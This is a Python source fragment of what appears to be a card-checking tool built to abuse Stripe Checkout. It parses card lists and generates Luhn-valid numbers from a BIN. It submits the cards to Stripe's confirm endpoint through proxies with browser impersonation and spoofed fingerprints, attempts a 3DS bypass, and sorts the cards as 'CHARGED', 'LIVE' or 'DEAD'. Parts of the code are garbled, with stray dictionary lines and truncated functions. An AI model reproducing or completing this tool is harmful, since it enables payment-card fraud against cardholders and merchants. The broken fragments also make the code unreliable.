class Stats:
    def __init__(self):
        self._lock  = threading.Lock()
        self.total    = 0
        self.charged  = 0
        self.live     = 0
        self.dead     = 0
        self.declined = 0
        self.errors   = 0
        self.start    = time.time()

    def add(self, status: str):
        with self._lock:
            self.total += 1
            s = status.upper()
            if s == "CHARGED":    self.charged  += 1
            elif s == "LIVE":     self.live     += 1
            elif s == "DEAD":     self.dead     += 1
            elif s in ("DECLINED", "3DS"):  self.declined += 1
            else:                 self.errors   += 1

    def elapsed(self):
        return round(time.time() - self.start, 1)

    def line(self):
        return (
            f"{green(f'CHG:{self.charged}')}  "
            f"{cyan(f'LIV:{self.live}')}  "
            f"{red(f'DED:{self.dead}')}  "
            f"{yellow(f'DEC:{self.declined}')}  "
            f"{grey(f'ERR:{self.errors}')}  "
            f"{white(f'TOT:{self.total}')}  "
            f"{grey(f't:{self.elapsed()}s')}"
        )

def _proxy_url(p: str) -> Optional[str]:
    if not p: return None
    p = p.strip()
    if p.startswith("http"): return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return None

def _clean(text: str) -> str:
    if not text: return ""

        "incorrect_cvc":"Incorrect CVC","insufficient_funds":"Insufficient Funds",
        "expired_card":"Card Expired","card_declined":"Card Declined",
        "do_not_honor":"Do Not Honor","fraudulent":"Fraudulent",

        "incorrect_zip":"Incorrect ZIP","processing_error":"Processing Error",

    text = re.sub(r'https?://\S+','',text)

def _decode_url(url: str) -> Dict:
    r = {"pk": None, "cs": None}
    try:
        cs = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]+)', url)
        if cs: r["cs"] = cs.group(1)
        if '#' in url:
            frag = unquote(url.split('#', 1)[1])
            try:
                xored = ''.join(chr(b ^ 5) for b in base64.b64decode(frag))
                pk = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]+)', xored)
                if pk: r["pk"] = pk.group(1)
            except Exception: pass
    except Exception: pass
    return r

    def _build_confirm(pm_payload: Any, is_direct: bool = False) -> dict:
        addr = billing["addr"]
        conf = {
            "eid": "NA",
            "expected_payment_method_type": "card",
            "key": pk,
            "init_checksum": checksum,
            "return_url": "https://checkout.stripe.com",
            "consent[terms_of_service]": "accepted",
        }
        if is_direct:
            conf.update({
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": card["cc"],
                "payment_method_data[card][cvc]": card["cvv"],
                "payment_method_data[card][exp_month]": card["month"],
                "payment_method_data[card][exp_year]": card["year"],
                "payment_method_data[guid]": fp["guid"],
                "payment_method_data[muid]": fp["muid"],
                "payment_method_data[sid]": fp["sid"],
                "payment_method_data[pasted_fields]": fp["pasted_fields"],
                "payment_method_data[payment_user_agent]": fp["payment_user_agent"],
                "payment_method_data[billing_details][name]": billing["name"],
                "payment_method_data[billing_details][email]": billing["email"],
                "payment_method_data[billing_details][address][country]": addr["country"],
                "payment_method_data[billing_details][address][postal_code]": addr["postal_code"],
                "payment_method_data[billing_details][address][line1]": addr["line1"],
                "payment_method_data[billing_details][address][city]": addr["city"],
                "payment_method_data[billing_details][address][state]": addr["state"],
            })
        else:
            conf["payment_method"] = pm_payload

        if mode == "setup":
            conf["expected_amount"] = 0
        else:
            conf["expected_amount"] = total
            conf["last_displayed_line_item_group_details[subtotal]"] = subtotal
            conf["last_displayed_line_item_group_details[total_exclusive_tax]"] = 0
            conf["last_displayed_line_item_group_details[total_inclusive_tax]"] = 0
            conf["last_displayed_line_item_group_details[total_discount_amount]"] = 0
            conf["last_displayed_line_item_group_details[shipping_rate_amount]"] = 0
        return conf

    def _do_confirm(conf: dict) -> Optional[dict]:
        try:
            r = cffi_requests.post(
                f"{STRIPE_API}/payment_pages/{cs}/confirm",
                headers=hdrs, data=urlencode(conf),
                cookies=cookies, proxies=proxies,
                impersonate=imp, timeout=30,
            )
            return r.json()
        except Exception:
            return None

    def _is_confirm_err(c: dict) -> bool:
        if "error" not in c: return False
        msg = c["error"].get("message","").lower()
        code = c["error"].get("code","").lower()
        return any(x in msg for x in ["error confirming","invoice","doesn't match","latest invoice"]) \
            or code in ("amount_too_large","amount_too_small","invoice_not_found")

    def _retry_confirm(conf: dict) -> Optional[dict]:
        # Strategy 1: no consent
        c1 = dict(conf); c1.pop("consent[terms_of_service]", None)
        r1 = _do_confirm(c1)
        if r1 and not _is_confirm_err(r1): return r1
        # Strategy 2: amount=0 (setup-like)
        c2 = dict(conf); c2["expected_amount"] = 0
        for k in list(c2): 
            if k.startswith("last_displayed"): c2.pop(k)
        r2 = _do_confirm(c2)
        if r2 and not _is_confirm_err(r2): return r2
        return r1

    def _parse_confirm(conf_result: dict) -> dict:
        if not conf_result:
            return {**result, "response": "No response", "time": round(time.perf_counter()-start,2)}

        if "error" in conf_result:
            err  = conf_result["error"]
            msg  = err.get("message","")
            dc   = err.get("decline_code","") or err.get("code","")
            msg_low = msg.lower()

            if "integration surface" in msg_low or "tokenization" in msg_low:
                return {**result, "status":"NOT SUPPORTED", "response":"Tokenization blocked", "time": round(time.perf_counter()-start,2)}
            if "no longer active" in msg_low or "expired" in msg_low:
                return {**result, "status":"EXPIRED", "response":"Session expired", "time": round(time.perf_counter()-start,2)}
            if dc == "expired_card" or "card has expired" in msg_low:
                return {**result, "status":"EXPIRED", "response":"Card expired", "decline_code":dc, "time": round(time.perf_counter()-start,2)}

            status = _classify(dc, msg)
            return {**result, "status":status, "response":_clean(msg), "decline_code":dc, "time": round(time.perf_counter()-start,2)}

        # Check for 3DS
        pi_obj = conf_result.get("payment_intent") or {}
        if isinstance(pi_obj, dict):
            next_action = pi_obj.get("next_action") or {}
            action_type = next_action.get("type","")
            pi_id       = pi_obj.get("id")
            pi_secret   = pi_obj.get("client_secret")

            if action_type == "use_stripe_sdk" and pi_id and pi_secret:
                bypass = _attempt_3ds_bypass(pk, pi_id, pi_secret, proxy_url, cookies, profile)
                if bypass:
                    return {**result, **bypass, "time": round(time.perf_counter()-start,2)}
                return {**result, "status":"3DS", "response":"3DS Required", "time": round(time.perf_counter()-start,2)}

            if action_type == "redirect_to_url":
                return {**result, "status":"3DS", "response":"3DS Redirect Challenge", "time": round(time.perf_counter()-start,2)}

            pi_status = pi_obj.get("status","")
            if pi_status == "succeeded":
                return {**result, "status":"CHARGED", "response":"Payment successful", "time": round(time.perf_counter()-start,2)}
            if pi_status in ("processing","requires_capture"):
                return {**result, "status":"CHARGED", "response":"Payment processing", "time": round(time.perf_counter()-start,2)}

        # Check setup intent
        si_obj = conf_result.get("setup_intent") or {}
        if isinstance(si_obj, dict) and si_obj.get("status") == "succeeded":
            return {**result, "status":"CHARGED", "response":"Setup succeeded", "time": round(time.perf_counter()-start,2)}

        # Success URL present = charged
        if conf_result.get("success_url") or conf_result.get("redirect_to_url"):
            return {**result, "status":"CHARGED", "response":"Payment successful", "time": round(time.perf_counter()-start,2)}

        return {**result, "status":"FAILED", "response":"Unknown response", "time": round(time.perf_counter()-start,2)}

    # ── Try Method A (PM + confirm) ───────────────────────────
    conf_result = None
    if pm_id:
        conf = _build_confirm(pm_id)
        conf_result = _do_confirm(conf)
        if conf_result and _is_confirm_err(conf_result):
            conf_result = _retry_confirm(conf)

    # ── Method B fallback (direct embedded) ──────────────────
    if not conf_result or (pm_id is None and not conf_result):
        conf = _build_confirm(None, is_direct=True)
        conf_result = _do_confirm(conf)
        if conf_result and _is_confirm_err(conf_result):
            conf_result = _retry_confirm(conf)

    return _parse_confirm(conf_result)

#  CARD PARSER
# ══════════════════════════════════════════════════════════════

def parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    sep = "|" if "|" in raw else " "
    parts = [p.strip() for p in raw.split(sep) if p.strip()]
    if len(parts) < 4: return None
    cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
    cc = re.sub(r'\D','', cc)
    month = re.sub(r'\D','', month).lstrip("0") or "1"
    year = re.sub(r'\D','', year)
    if len(year) == 2: year = "20" + year
    cvv = re.sub(r'\D','', cvv)
    if not (13 <= len(cc) <= 19): return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(raw: str) -> List[dict]:
    cards = []
    for line in raw.strip().splitlines():
        c = parse_card(line)
        if c: cards.append(c)
    return cards

#  GENERATE CARDS FROM BIN
# ══════════════════════════════════════════════════════════════

def generate_from_bin(bin_str: str, count: int = 10) -> List[dict]:
    bin_str = re.sub(r'\D','', bin_str)[:16].ljust(6, 'x')
    cards = []
    for _ in range(count):
        prefix = bin_str.replace('x','')
        needed = 16 - len(prefix)
        num = prefix + "".join(random.choices(string.digits, k=needed))
        # Luhn fix
        digits = [int(d) for d in num]
        check = 0
        for i, d in enumerate(reversed(digits[:-1])):
            if i % 2 == 0: d = d * 2
            if d > 9: d -= 9
            check += d
        check_digit = (10 - (check % 10)) % 10
        num = num[:-1] + str(check_digit)
        month = str(random.randint(1, 12))
        year  = str(random.randint(2025, 2030))
        cvv   = "".join(random.choices(string.digits, k=3))
        cards.append({"cc": num, "month": month, "year": year, "cvv": cvv})
    return cards

#  API CHECK
# ══════════════════════════════════════════════════════════════

def check_api(pk: str) -> dict:
    """Check if a Stripe PK is live/test and valid."""
    try:
        r = cffi_requests.get(
            f"https://api.stripe.com/v1/tokens",
            headers={"Authorization": f"Bearer {pk}"},
            impersonate="chrome124", timeout=8,
        )
        if r.status_code == 200:
            return {"valid": True, "live": "pk_live" in pk, "status": "Active"}
        elif r.status_code == 401:
            return {"valid": False, "live": False, "status": "Invalid Key"}
        elif r.status_code == 403:
            return {"valid": True, "live": "pk_live" in pk, "status": "Restricted"}
        return {"valid": False, "live": False, "status": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"valid": False, "live": False, "status": f"Error: {str(e)[:40]}"}

def ask(prompt: str, default: str = "") -> str:
    try:
        val = input(f"{C.YELLOW}{prompt}{C.RESET}").strip()
        return val if val else default
    except KeyboardInterrupt:
        print("\n" + red("Cancelled.")); sys.exit(0)

def ask_int(prompt: str, default: int = 1) -> int:
    val = ask(prompt, str(default))
